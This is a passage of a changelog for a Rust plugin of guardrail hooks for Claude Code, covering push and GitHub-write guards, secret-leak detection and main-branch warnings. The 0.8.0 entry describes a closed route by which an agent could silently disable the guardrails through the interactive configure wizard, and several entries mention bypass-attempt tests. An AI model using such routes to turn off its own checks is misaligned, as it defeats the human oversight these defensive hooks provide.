- `nudge-polish-before-pr` hook (cadence plugin) fires on `gh pr create` and reminds the model to run `/polish` (cadence-forge:polish) — a branch-scoped polish pass against `origin/main` — before opening the PR. Gated by `if: "Bash(gh pr create*)"` so the binary only spawns on actual PR-create commands. Skippable for trivial fixes or branches already polished. Disable via `CADENCE_DISABLE=nudge-polish-before-pr`.
- `CADENCE_ALLOW_MAIN` env var permanently silences `warn-main-branch` for a repo. Set in `<repo>/.claude/settings.json` (project) or `~/.claude/settings.json` (user-global) under the `env` block. Truthy values: `1`, `true`, `yes` (case-insensitive). Useful for repos where main IS the working branch by design — personal scratchpads, dotfiles, vaults.
- `cadence-hooks doctor` subcommand scans installed plugin `hooks.json` files for shell-expansion bugs (initially: single-quoted `${CLAUDE_PLUGIN_ROOT}` and bare env vars). Reports one block per offender; exits 1 when violations exist. `--root <dir>` overrides the default `~/.claude/plugins/cache` scan path. (#24)
- `Check::skip_at_effort()` trait method lets individual checks opt out at specific `$CLAUDE_EFFORT` levels without each implementer reading the env var by hand. Default `&[]` preserves current behavior — opt in for heavy diagnostics that are optional on trivial sessions. (#23)

### Changed

- `warn-main-branch` message now suggests `--for 2h` (was `30m`) and surfaces both silencing options: time-bounded snooze and permanent `CADENCE_ALLOW_MAIN` env var.

### Fixed

- `warn-main-branch` now scopes branch detection to the edited file's repo via `git -C`, resolves relative file paths against `HookInput.cwd`, and passes the resolved `repo_root` to the snooze lookup. Previously the hook resolved git context from the hook process's CWD, so editing inside a nested repo from a session whose CWD was the outer parent both fired wrong warnings and broke per-repo snooze suppression. (#26)
- `prevent-secret-leaks` env-dump heuristic now position-checks chain segments with a quote-aware splitter instead of substring-matching. Eliminates false positives on benign commands containing `env` as a substring — branch names ending in `-env`, commit messages mentioning env vars, `gh env list`, `aws-vault env`, `direnv env`, `grep env_dump`, and heredocs inside `"$(...)"` no longer fire the nudge. (#22, #25)

## [0.8.0] - 2026-04-21

### Changed (breaking)

- Renamed all configuration env vars under a unified `CADENCE_*` prefix:
  - `CADENCE_HOOKS_DISABLE` → `CADENCE_DISABLE`
  - `CADENCE_HOOKS_BYPASS` → `CADENCE_BYPASS`
  - `GIT_GUARDRAILS_ALLOWED_OWNERS` → `CADENCE_ALLOWED_OWNERS`
  - `GIT_GUARDRAILS_ALLOWED_REPOS` → `CADENCE_ALLOWED_REPOS`
- `OBSIDIAN_VAULT` stays unprefixed (cross-tool convention).

### Added

- Under Claude Code (detected via `CLAUDECODE=1`), the `configure` subcommand is hidden from `--help` and refuses to run interactively. `configure --list` stays available. This closes a bypass route where an agent could silently disable guardrails by launching the interactive wizard.

### Migration

Update `.claude/settings.json` or any shell rc where you set the old vars:

```diff
- "CADENCE_HOOKS_DISABLE": "guard-push-remote"
+ "CADENCE_DISABLE": "guard-push-remote"
- "GIT_GUARDRAILS_ALLOWED_OWNERS": "cameronsjo cameron"
+ "CADENCE_ALLOWED_OWNERS": "cameronsjo cameron"
```

## [0.4.1] - 2026-03-16

### Added

- AST-based chain analysis for `git push` — chained pushes to the same remote (e.g. `git push origin main && git push origin v1.0`) are now allowed instead of blanket-blocked
- 15 adversarial tests for chain analysis bypass attempts

### Fixed

- Cross-platform `bump-version.sh` — works on both macOS and Linux

## [0.4.0] - 2026-03-16

### Added

- AST-based loop analysis via `brush-parser` — loops with explicit targets pointing to owned repos are now permitted instead of blanket-blocked
- `warn-cron-datetime` guardrail for CronCreate hooks
- Unit tests for `warn-main-branch` (10 tests) and `check-idle-return` (11 tests)
- Adversarial input tests and edge case hardening across all hooks
- Panic handler for graceful failure reporting

### Changed

- Extracted shared shell utilities (`strip_quotes`, `repo_from_url`, `git_command`, `parse_work_dir`) into `cadence-hooks-core::shell`
- `guard-gh-write` now resolves `cd` chains via `parse_work_dir`
- Reordered `guard-push-remote` checks so structural blocks precede env var checks
- Narrowed version-mismatch catch-all to specific clap error kinds
- 551 tests (up from 486)

### Fixed

- Normalized file paths to prevent bypass attacks
- Reduced false positives from CodeRabbit review findings
- Fail open with warning on plugin version mismatch

## [0.3.0] - 2026-03-12

### Added

- Initial implementation: 19 hooks across 4 plugin crates
- Core protocol library (`cadence-hooks-core`) with `Check` trait, JSON parsing, exit codes
- **cadence** hooks: terminology, orphaned-todos, prevent-secret-leaks, prevent-secret-writes, memory-guard, git-safety, line-endings, env-vars, warn-untracked, markdown-lint
- **guardrails** hooks: guard-push-remote, guard-gh-write, guard-gh-dangerous, guard-git-init, warn-main-branch, check-idle-return
- **rules** hooks: validate-frontmatter, security-patterns
- **obsidian** hooks: trash-guard
- CI workflow with fmt, clippy, and test checks
- Release workflow with cross-compilation (linux x86_64/aarch64, macOS x86_64/aarch64)
- SLSA build provenance attestation on releases
- 486 tests covering happy paths, edge cases, and bypass scenarios
